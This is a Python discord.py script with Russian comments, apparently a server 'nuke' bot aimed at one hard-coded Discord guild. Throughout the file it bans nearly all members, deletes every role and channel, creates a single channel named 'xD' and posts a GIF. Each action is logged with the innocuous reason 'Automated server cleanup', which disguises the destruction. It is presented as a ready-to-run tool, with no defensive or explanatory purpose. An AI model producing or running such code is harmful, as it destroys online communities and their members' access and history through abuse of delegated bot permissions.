import os
import asyncio
import discord

# ==========================================
# НАСТРОЙКИ
# ==========================================

GUILD_ID = 1127290770026676325

# User ID пользователей, которых НЕЛЬЗЯ банить
EXCLUDED_USER_IDS = [
    1267028432596897959
]

NEW_CHANNEL_NAME = "xD"

GIF_URL = "https://example.com/your.gif"

DELAY = 0.5

TOKEN = os.getenv("DISCORD_TOKEN")


# ==========================================
# INTENTS
# ==========================================

intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)


# ==========================================
# БАН УЧАСТНИКОВ
# ==========================================

async def ban_everyone(guild):

    print("")
    print("========== ИСКЛЮЧЕНИЯ ==========")

    for user_id in EXCLUDED_USER_IDS:
        member = guild.get_member(user_id)

        if member:
            print(
                f"НЕ БАНИТЬ: {member} | "
                f"ID: {member.id}"
            )
        else:
            print(
                f"ИСКЛЮЧЕНИЕ НЕ НАЙДЕНО НА СЕРВЕРЕ | "
                f"ID: {user_id}"
            )

    print("================================")
    print("")

    print("Начинаю бан участников...")

    members = list(guild.members)

    for member in members:

        # ==================================
        # ПРОВЕРКА ИСКЛЮЧЕНИЯ
        # ==================================

        if member.id in EXCLUDED_USER_IDS:
            print(
                f">>> ПРОПУСКАЮ ИСКЛЮЧЁННОГО: "
                f"{member} | ID: {member.id}"
            )
            continue

        # ==================================
        # ВЛАДЕЛЕЦ СЕРВЕРА
        # ==================================

        if member == guild.owner:
            print(
                f"ПРОПУСК ВЛАДЕЛЬЦА: "
                f"{member}"
            )
            continue

        # ==================================
        # ПРОВЕРКА ИЕРАРХИИ
        # ==================================

        if member.top_role >= guild.me.top_role:
            print(
                f"ПРОПУСК ИЗ-ЗА ИЕРАРХИИ: "
                f"{member}"
            )
            continue

        # ==================================
        # БАН
        # ==================================

        try:

            await member.ban(
                reason="Automated server cleanup",
                delete_message_seconds=0
            )

            print(
                f"ЗАБАНЕН: "
                f"{member} | ID: {member.id}"
            )

        except Exception as e:

            print(
                f"ОШИБКА БАНА {member}: "
                f"{e}"
            )

        await asyncio.sleep(DELAY)


# ==========================================
# УДАЛЕНИЕ РОЛЕЙ
# ==========================================

async def delete_all_roles(guild):

    print("")
    print("Начинаю удаление ролей...")

    for role in list(guild.roles):

        # @everyone удалить нельзя
        if role.is_default():
            continue

        # Роль выше/равна роли бота
        if role >= guild.me.top_role:
            print(
                f"ПРОПУСК РОЛИ: "
                f"{role.name}"
            )
            continue

        try:

            role_name = role.name

            await role.delete(
                reason="Automated server cleanup"
            )

            print(
                f"РОЛЬ УДАЛЕНА: "
                f"{role_name}"
            )

        except Exception as e:

            print(
                f"ОШИБКА УДАЛЕНИЯ РОЛИ "
                f"{role.name}: {e}"
            )

        await asyncio.sleep(DELAY)


# ==========================================
# УДАЛЕНИЕ КАНАЛОВ
# ==========================================

async def delete_all_channels(guild):

    print("")
    print("Начинаю удаление каналов...")

    for channel in list(guild.channels):

        try:

            channel_name = channel.name

            await channel.delete(
                reason="Automated server cleanup"
            )

            print(
                f"КАНАЛ УДАЛЕН: "
                f"{channel_name}"
            )

        except Exception as e:

            print(
                f"ОШИБКА УДАЛЕНИЯ КАНАЛА "
                f"{channel.name}: {e}"
            )

        await asyncio.sleep(DELAY)


# ==========================================
# СОЗДАНИЕ КАНАЛА
# ==========================================

async def create_channel(guild):

    print("")
    print("Создаю новый канал...")

    try:

        channel = await guild.create_text_channel(
            NEW_CHANNEL_NAME,
            reason="Automated server cleanup"
        )

        print(
            f"КАНАЛ СОЗДАН: "
            f"{channel.name}"
        )

        return channel

    except Exception as e:

        print(
            f"ОШИБКА СОЗДАНИЯ КАНАЛА: "
            f"{e}"
        )

        return None


# ==========================================
# ОТПРАВКА GIF
# ==========================================

async def send_gif(channel):

    if channel is None:
        return

    try:

        await channel.send(GIF_URL)

        print("GIF ОТПРАВЛЕН")

    except Exception as e:

        print(
            f"ОШИБКА ОТПРАВКИ GIF: "
            f"{e}"
        )


# ==========================================
# ЗАПУСК
# ==========================================

@client.event
async def on_ready():

    print("")
    print("======================================")
    print("БОТ ЗАПУЩЕН")
    print(f"Аккаунт: {client.user}")
    print("======================================")

    guild = client.get_guild(GUILD_ID)

    if guild is None:

        print(
            f"СЕРВЕР НЕ НАЙДЕН: {GUILD_ID}"
        )

        await client.close()
        return

    print(
        f"Сервер: {guild.name}"
    )

    print(
        f"Server ID: {guild.id}"
    )

    # ======================================
    # ПРАВА БОТА
    # ======================================

    me = guild.me

    print("")
    print("========== ПРАВА БОТА ==========")

    print(
        f"Administrator: "
        f"{me.guild_permissions.administrator}"
    )

    print(
        f"Ban Members: "
        f"{me.guild_permissions.ban_members}"
    )

    print(
        f"Manage Roles: "
        f"{me.guild_permissions.manage_roles}"
    )

    print(
        f"Manage Channels: "
        f"{me.guild_permissions.manage_channels}"
    )

    print(
        f"Роль бота: "
        f"{me.top_role.name}"
    )

    print("================================")
    print("")

    # ======================================
    # ПОКАЗЫВАЕМ ИСКЛЮЧЕНИЯ
    # ======================================

    print("========== EXCLUDED USERS ==========")

    for user_id in EXCLUDED_USER_IDS:

        member = guild.get_member(user_id)

        if member:

            print(
                f"ИСКЛЮЧЁН: "
                f"{member} | "
                f"ID: {member.id}"
            )

        else:

            print(
                f"НЕ НАЙДЕН: "
                f"ID {user_id}"
            )

    print("====================================")
    print("")

    # ======================================
    # 1. БАН
    # ======================================

    await ban_everyone(guild)

    # ======================================
    # 2. УДАЛЕНИЕ РОЛЕЙ
    # ======================================

    await delete_all_roles(guild)

    # ======================================
    # 3. УДАЛЕНИЕ КАНАЛОВ
    # ======================================

    await delete_all_channels(guild)

    # ======================================
    # 4. СОЗДАНИЕ КАНАЛА
    # ======================================

    new_channel = await create_channel(guild)

    # ======================================
    # 5. GIF
    # ======================================

    await send_gif(new_channel)

    print("")
    print("======================================")
    print("ОПЕРАЦИЯ ЗАВЕРШЕНА")
    print("======================================")

    await client.close()


# ==========================================
# ЗАПУСК CLIENT
# ==========================================

if not TOKEN:

    print(
        "ОШИБКА: DISCORD_TOKEN не найден!"
    )

else:

    client.run(TOKEN)
